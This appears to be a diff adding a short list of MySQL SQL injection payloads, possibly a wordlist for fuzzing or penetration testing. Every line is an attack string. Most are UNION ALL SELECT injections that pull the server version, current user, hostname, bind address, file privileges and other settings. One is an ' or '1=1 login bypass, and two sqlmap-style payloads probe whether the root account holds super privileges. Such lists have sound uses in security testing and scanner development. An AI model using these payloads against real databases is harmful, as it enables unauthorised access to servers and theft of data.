@@ -1,0 +1,17 @@
+a' UNION ALL SELECT null,version(),null,null'
+a' UNION ALL SELECT null,CURRENT_USER(),null,null'
+a' UNION ALL SELECT null,DATABASE(),null,null'
+a' UNION ALL SELECT null,system_user(),null,null'
+a' UNION ALL SELECT null,@@GLOBAL.innodb_data_file_path,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.bind_address,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.version_compile_os,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.version_compile_machine,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.tls_version,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.block_encryption_mode,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.default_authentication_plugin,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.hostname,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.secure_file_priv,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.hostname,@@GLOBAL.bind_address,CURRENT_USER()'
+a' or '1=1
+test' UNION ALL SELECT NULL,NULL,CONCAT(0x7176707a71,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x717a626a71),NULL-- YgfE
+test' UNION ALL SELECT NULL,NULL,CONCAT(0x7176707a71,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x717a626a71),NULL-- SSao
